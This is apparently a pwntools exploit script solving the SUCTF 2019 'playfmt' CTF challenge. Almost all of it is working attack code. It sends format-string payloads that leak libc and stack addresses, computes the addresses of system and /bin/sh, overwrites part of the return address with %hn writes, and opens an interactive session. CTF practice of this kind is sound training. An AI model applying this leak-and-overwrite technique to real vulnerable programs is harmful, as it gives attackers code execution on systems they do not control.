#!/usr/bin/env python3
# Date: 2024-11-12 18:42:31

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.binary = './suctf_2019_playfmt'
context.log_level = 'debug'
context.timeout = 120

io = process('./suctf_2019_playfmt')
# io = remote('127.0.0.1', 13337)
elf = ELF('./suctf_2019_playfmt')
libc = ELF('../libs/ubuntu18-libc.so.6')
one_gadgets = [0x3cdea, 0x3cdec, 0x3cdf0, 0x3cdf7, 0x6749f, 0x674a0, 0x1357ae, 0x1357af]

def debug(gdbscript="", stop=False):
    if isinstance(io, process):
        gdb.attach(io, gdbscript=gdbscript)
        if stop:
            pause()

stop = pause
S = pause
leak = lambda name, address: log.info("{} ===> {}".format(name, hex(address)))
s   = io.send
sl  = io.sendline
sla = io.sendlineafter
sa  = io.sendafter
slt = io.sendlinethen
st  = io.sendthen
r   = io.recv
rn  = io.recvn
rr  = io.recvregex
ru  = io.recvuntil
ra  = io.recvall
rl  = io.recvline
rs  = io.recvlines
rls = io.recvline_startswith
rle = io.recvline_endswith
rlc = io.recvline_contains
ia  = io.interactive
ic  = io.close
cr  = io.can_recv


debug("b do_fmt")

ru(b'=====================')
ru(b'=====================')
s(b'%23$p,,,%6$pAAAA')
libc_base = int(ru(b',,,')[:-3], 16) - libc.sym['__libc_start_main'] - 121
esp_addr = int(ru(b'AAAA')[:-4], 16)
ebp_addr = esp_addr + 0x18
ret_addr = ebp_addr + 0x4

leak('libc_base', libc_base)
leak('esp_addr', esp_addr)
leak('ebp_addr', ebp_addr)

system_addr = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

payload = '%' + str(ret_addr & 0xffff) + 'c%6$hnABAB'
s(payload.encode())
ru(b'ABAB')

payload = '%' + str(system_addr & 0xffff) + 'c%14$hnABAB'
s(payload.encode())
ru(b'ABAB')

ia()